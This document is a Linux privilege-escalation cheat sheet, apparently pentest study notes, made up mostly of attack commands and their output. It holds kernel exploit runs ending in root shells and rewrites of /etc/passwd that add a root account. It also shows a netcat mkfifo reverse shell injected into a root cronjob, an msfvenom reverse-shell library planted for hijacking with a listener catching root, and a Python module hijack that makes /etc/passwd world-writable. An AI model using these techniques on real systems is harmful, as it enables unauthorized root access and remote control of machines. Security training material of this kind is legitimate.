# Linux Privilege Escalation

## Upgrade Shell

[PayloadsAllTheThings: Spawn TTY Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)

### Spawning a TTY Shell

=== "python"

	``` bash
	python -c 'import pty; pty.spawn("/bin/sh")'
	```

	``` bash
	python3 -c 'import pty; pty.spawn("/bin/sh")'
	```

=== "script"

	``` bash
	/usr/bin/script -qc /bin/sh /dev/null
	```

=== "perl"

	``` bash
	perl -e 'exec "/bin/sh";'
	```

	``` bash
	perl: exec "/bin/sh";
	```

=== "ruby"

	``` bash
	ruby: exec "/bin/sh"
	```

=== "os.system"

	``` bash
	echo os.system('/bin/bash')
	```

=== "sh -i"

	``` bash
	/bin/sh -i
	```

=== "lua"

	``` bash
	lua: os.execute('/bin/sh')
	```

=== "In an editor"

	(From within IRB)

	``` bash
	exec "/bin/sh"
	```

	(From within vi)

	``` bash
	:!bash
	```

	(From within vi)

	``` bash
	:set shell=/bin/bash:shell
	```

	(From within nmap)

	``` bash
	!sh
	```

### Export Terminal

``` bash
export TERM=xterm
```

^Z

``` bash
stty raw -echo; fg
```

``` bash
stty rows 42 columns 172
```

## User Enumeration

Current User

``` bash
hostname && whoami && id
```

Which ones have a valid shell

``` bash
grep -vE "nologin|false" /etc/passwd
```

Folder

``` bash
pwd; ls -la
```

## OS & Architecture & Kernel

Kernel version and Architecture

``` bash
uname -a
```

``` bash
cat /etc/issue; uname -r; arch
```

What's the OS?

``` bash
cat /etc/*-release
```

``` bash
lsb_release -a (Debian based OSs)
```

Drivers & Kernel Modules

``` bash
lsmod
```

``` bash
/sbin/modinfo <name>
```

### Compile exploit in C/C++

=== "Compile file"

	``` bash
	$ gcc -m32 Size.c -o x86-S
	```

	``` bash
	$ ./x86-S
	Size = 4 
	```

	``` bash
	$ gcc Size.c -o x64-S
	```

	``` bash
	$ ./x64-S
	Size = 8
	```

=== "File Size.c"

	``` c
	#include<stdio.h>
	int main()
	{
	        printf("Size = %lu", sizeof(size_t));
	}
	```

### <= 2.6.36-rc8 - 'RDS Protocol'

``` bash
www-data@ip:/tmp$ uname -a
Linux ip 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
```

[https://fareedfauzi.gitbook.io/oscp-notes/linux-post-exploitation/linux-exploitation#exploits-worth-running](https://fareedfauzi.gitbook.io/oscp-notes/linux-post-exploitation/linux-exploitation#exploits-worth-running)

[https://www.exploit-db.com/raw/15285](https://www.exploit-db.com/raw/15285)

``` bash
gcc -m32 15285.c -o 15285
```

``` bash
www-data@ip:/tmp$ ./15285
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08c8c2c
 [+] Resolved default_security_ops to 0xc0773300
 [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# id
uid=0(root) gid=0(root)
```

### <= 2.6.37 'Full-Nelson.

```
www-data@popcorn:/home/george$ uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
www-data@popcorn:/home/george$ cat /etc/issue
cat /etc/issue
Ubuntu 9.10 \n \l
```

[https://www.exploit-db.com/exploits/15704](https://www.exploit-db.com/exploits/15704)

```
www-data@popcorn:/var/www$ gcc 15704.c -o 15704
gcc 15704.c -o 15704
www-data@popcorn:/var/www$ chmod +x 15704
chmod +x 15704
www-data@popcorn:/var/www$ ./15704
./15704
[*] Resolving kernel addresses...
 [+] Resolved econet_ioctl to 0xf846a280
 [+] Resolved econet_ops to 0xf846a360
 [+] Resolved commit_creds to 0xc01645d0
 [+] Resolved prepare_kernel_cred to 0xc01647d0
[*] Calculating target...
[*] Failed to set Econet address.
[*] Triggering payload...
[*] Got root!
# whoami
whoami
root
# 
```

### 2.6.39 < 3.2.2 (x86/x64)

``` bash
www-data@hades:/tmp$ uname -a
Linux hades 3.0.0-12-server #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
```

[https://www.exploit-db.com/exploits/35161](https://www.exploit-db.com/exploits/35161)

``` bash
www-data@hades:/tmp$ ./35161 
===============================
=          Mempodipper        =
=           by zx2c4          =
=         Jan 21, 2012        =
===============================

[+] Ptracing su to find next instruction without reading binary.
[+] Creating ptrace pipe.
[+] Forking ptrace child.
[+] Waiting for ptraced child to give output on syscalls.
[+] Ptrace_traceme'ing process.
[+] Error message written. Single stepping to find address.
[+] Resolved call address to 0x401ce8.
[+] Opening socketpair.
[+] Waiting for transferred fd in parent.
[+] Executing child from child fork.
[+] Opening parent mem /proc/2338/mem in child.
[+] Sending fd 6 to parent.
[+] Received fd at 6.
[+] Assigning fd 6 to stderr.
[+] Calculating su padding.
[+] Seeking to offset 0x401cdc.
[+] Executing su with shellcode.
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

## Processes and Services

``` bash
ps axu
```

[How to check if port is in use in](https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/)

``` bash
sudo lsof -i -P -n | grep LISTEN
```

[List all enabled services from systemctl](https://askubuntu.com/questions/795226/how-to-list-all-enabled-services-from-systemctl)

``` bash
systemctl list-unit-files | grep enabled
```

### Active network connection

``` bash
ss -anp
```

``` bash
netstat -antup
```

## Binaries That AutoElevate

``` bash
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
```

## Check sudo access 

``` bash
$ sudo -l
[sudo] password for Hades: 
Matching Defaults entries for pentesterlab on 7358cafc3ebe:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User Hades may run the following commands:
    (victim) /bin/bash
```

Mix cp/chown and chmod

[https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial](https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial)

[https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries)

``` bash
sudo -l
Matching Defaults entries for Hades:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User Hades may run the following commands:
    (victim) /bin/chmod, /bin/cp
```

## Readable/Writable

``` bash
find / -writable -type d 2>/dev/null
```

``` bash
find / -writable 2>/dev/null
```

### File /etc/passwd

File /etc/passwd can be modify by user permission.

``` bash
ls -l /etc/passwd
-rw-rw-rw- 1 root root <snip> /etc/passwd
```

``` bash
$ openssl passwd 
Password: 
Verifying - Password: 
QzKsrWCYxmRPY
```

`QzKsrWCYxmRPY` : non password hash.

``` bash
sed 's/root:x:/root:QzKsrWCYxmRPY:/' /etc/passwd > passwd
cat passwd > /etc/passwd
su
```

Generate password for new user

``` bash
openssl passwd -1 -salt hades leecybersec
```

``` bash
echo toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/bash >> /etc/passwd
```

[https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)

## Scheduled Tasks

``` bash
ls -lah /etc/cron*
```

``` bash
cat /etc/crontab
```

``` bash
grep "CRON" /var/log/* 2>/dev/null
```

### Cronjob file insecure

Cronjob file check.sh overwrite, file check.sh running as root every 1 minute.

``` bash
ls -l check.sh
-rw-rw-rw- 1 root root <snip> check.sh
```

Can change file check.sh with user permission.

``` bash
echo "rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f" >> check.sh
```

### PATH Search Order Crontab

``` bash
$ cat /etc/crontab
<snip>
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

==> `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

``` bash
chloe@roquefort:~$ ls -ld /usr/local/bin
drwxrwsrwx 2 root staff 4096 Apr 24  2020 /usr/local/bin
```

``` bash
cp /tmp/shell /usr/local/bin/run-parts
```

[https://crontab.guru](https://crontab.guru): `*/5 : "At every 5th minute."`

``` bash
$ sudo nc -nvlp 22
listening on [any] 22 ...
connect to [ip] from (UNKNOWN) [ip] 37228
id
uid=0(root) gid=0(root) groups=0(root)
```

## Module Import Hijacking

### Dynamic Library Hijacking

``` bash
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""
<snip>
  *  *  *  *  * root       /usr/bin/log-sweeper
```

==> `LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils`

``` bash
[hades@hades ~]$ ls -ld /usr/local/lib/dev
drwxrwxrwx 2 root root 6 Sep  7  2020 /usr/local/lib/dev
```

``` bash
[hades@hades ~]$ ls -l /usr/bin/log-sweeper
-rwxr-xr-x. 1 root root 8800 Sep  4  2020 /usr/bin/log-sweeper
[hades@hades ~]$ /usr/bin/log-sweeper
/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory
```

exploit

``` bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.158 LPORT=6379 -f elf-so > utils.so
```

``` bash
[hades@hades dev]$ chmod 777 utils.so 
[hades@hades dev]$ pwd
/usr/local/lib/dev
```

``` bash
$ sudo nc -nvlp 6379
listening on [any] 6379 ...
connect to [ip] from (UNKNOWN) [ip] 55124
id
uid=0(root) gid=0(root) groups=0(root)
```

### Python Module Hijacking

``` python
$ cat python.py 
#!/usr/bin/python

import sys

try:
    import controller
except Exception:
    print "[!] ERROR: Unable to load controller module."
    sys.exit()
```

`controller module` not found.

Create file `controller.py` and add malicious python code.

``` bash
echo 'import os;os.system("chmod 777 /etc/passwd")' > controller.py
```

## Docker container

``` bash
root@315d7648a173:/# ls -lah
<snip>
-rwxr-xr-x   1 root root    0 Jun  9 13:01 .dockerenv
```

Mount disk to docker machine.

``` bash
mkdir -p /mnt/hola
```

``` bash
mount /dev/sda1 /mnt/hola
mount /dev/sda2 /mnt/hola
mount /dev/sda3 /mnt/hola
```

## Installed and Patch Levels

``` bash
dpkg -l (Debian based OSs)
```

``` bash
rpm -qa (CentOS / openSUSE )
```

``` bash
uname -a
```

## Networking Enumeration

### Interface and Routable

``` bash
ip a
```

``` bash
/sbin/route
```

## Firewall and Rules

``` bash
grep -Hs iptables /etc/*
```

## Unmounted Disks

List all mounted files system

``` bash
mount
```

``` bash
cat /etc/fstab
```

List all disk

``` bash
/bin/lsblk
```

Mount disk

``` bash
sudo mount -o nolock 192.168.11.131:/share ~/share
```

## Enumeration Tools

<a href='https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' target="blank">Basic Linux Privilege Escalation</a>

<a href='https://gtfobins.github.io/' target="blank">https://gtfobins.github.io</a>

<a href='https://github.com/DominicBreuker/pspy' target="blank">https://github.com/DominicBreuker/pspy</a>

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

[https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

## More Commands

### history, bashrc, backup

``` bash
find / -name *history* 2>/dev/null
find / -name *backup* 2>/dev/null
find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
```

### <a href='https://www.ssh.com/ssh/tunneling/example' target="blank">Port Tunneling</a>

Local Tunneling

``` bash
ssh -L $myport:127.0.0.1:5985 hades@192.168.11.133 -i id_rsa
```

Remote Tunneling

``` bash
ssh -R $myip:$myport:127.0.0.1:5985 kali@$myip -i kali-idrsa
```

SSH ESCAPE CHARACTERS

`~C` to type ssh command

### Generate SSH Key

``` bash
ssh-keygen -t rsa
```

``` bash
cp id_rsa.pub authorized_keys
```